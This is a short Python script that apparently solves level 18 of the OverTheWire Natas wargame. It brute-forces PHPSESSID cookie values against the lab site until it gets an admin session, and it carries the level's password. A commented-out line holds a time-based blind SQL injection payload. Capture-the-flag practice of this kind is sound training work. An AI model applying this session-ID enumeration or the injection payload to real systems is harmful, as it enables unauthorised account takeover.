#!/usr/bin/env python

import requests
import re

USER = 'natas18'
PASSWORD = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
url = 'http://natas18.natas.labs.overthewire.org/'

#r = requests.Session()
#response = r.post(url, data= {"username":'natas18" and hex(password) like "7877%" and SLEEP(5) #'},auth=(USER, PASSWORD))
#print(response.elapsed.total_seconds())


for l in range(1,640):
  r = requests.Session()
  #session = r.get('http://natas11.natas.labs.overthewire.org/', auth=(USER, PASSWORD'))
  response = r.post(url, cookies= {"PHPSESSID":str(l)}, auth=(USER, PASSWORD))
  if "You are an admin" in response.text:
      print "[+] got it!!!"
      print response.text
      break
  else:
      print str(l)

#print "[+] Key Complete: " + str(key.decode("hex"))
